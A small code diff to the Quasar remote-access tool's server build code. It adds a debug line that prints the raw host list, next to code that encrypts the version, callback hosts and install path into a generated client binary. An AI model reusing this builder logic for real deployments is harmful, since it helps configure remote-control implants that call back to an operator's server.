@@ -114,6 +114,7 @@ namespace Quasar.Server.Build
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                             break;
                                         case 2: //ip/hostname
+                                            Console.WriteLine(_options.RawHosts);
                                             methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                             break;
                                         case 3: //installsub
